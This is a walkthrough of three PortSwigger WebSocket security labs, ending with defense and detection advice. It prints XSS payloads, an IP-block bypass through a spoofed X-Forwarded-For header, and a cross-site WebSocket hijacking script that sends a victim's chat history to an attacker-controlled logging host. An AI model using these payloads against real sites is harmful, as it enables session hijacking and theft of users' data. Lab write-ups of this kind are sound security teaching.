# PortSwigger WebSockets 1-3 — The Handshake Is Still HTTP

This is a consolidated walkthrough of the three PortSwigger WebSockets labs.

All labs were solved in the authorized Web Security Academy environment. The main lesson is that WebSocket security has two layers: the HTTP handshake and the message stream. Both need authorization, CSRF protection, validation, and output encoding.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | manipulating WebSocket messages | client-side encoding only | intercept frame and send XSS HTML |
| 2 | cross-site WebSocket hijacking | no handshake CSRF/Origin defense | attacker page opens authenticated `wss://.../chat` and sends `READY` |
| 3 | manipulating the WebSocket handshake | flawed filter and IP block | change `X-Forwarded-For`, then bypass XSS filter |

## 2. Message manipulation

The client encodes `<` before sending chat messages, but the server-side path does not enforce equivalent validation. Intercept the WebSocket message and send:

```html
<img src=1 onerror='alert(1)'>
```

The support agent renders the message and executes the payload.

Client-side transformations are usability features, not security controls.

## 3. Cross-site WebSocket hijacking

The WebSocket handshake is authenticated by cookies but lacks a CSRF token and Origin enforcement. A malicious page can open the victim's chat socket:

```js
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = function() {
  ws.send('READY');
};
ws.onmessage = function(event) {
  fetch('https://EXPLOIT/log?m=' + encodeURIComponent(event.data), {mode: 'no-cors'});
};
```

`READY` returns the chat history. Officially this is often demonstrated with Collaborator, but the same Academy exploit-server access log pattern can receive the data via query string, so there is no hard OAST dependency.

## 4. Handshake manipulation

The third lab combines message filtering with handshake-level rate limiting. Because the WebSocket handshake is HTTP, headers still matter:

```http
X-Forwarded-For: 1.1.1.1
```

Changing this bypasses the IP-based block. The XSS filter can be bypassed with alternate casing and JavaScript template literal syntax:

```html
<img src=1 oNeRrOr=alert`1`>
```

## 5. Defense and detection

Hardening:

- Validate Origin on WebSocket handshakes.
- Require a CSRF token or one-time WebSocket token for stateful sockets.
- Bind sockets to the authenticated user server-side.
- Validate WebSocket messages against a strict schema.
- Encode output at the render sink; do not rely on client-side escaping.
- Trust `X-Forwarded-For` only from known proxies.
- Minimize chat history and account data returned by default commands such as `READY`.

Detection ideas:

- WebSocket handshakes to `/chat` from unexpected Origin values.
- Frames containing `<img`, `onerror`, `<script`, or `javascript:`.
- Repeated WebSocket handshakes with changing `X-Forwarded-For`.
- A cross-origin page opening a socket and immediately sending `READY`.
- Chat messages rendered as HTML in support/admin browsers.

No lab in this series required an unworkable Collaborator dependency; exploit-server logging can replace OAST for the CSWSH data-return pattern.
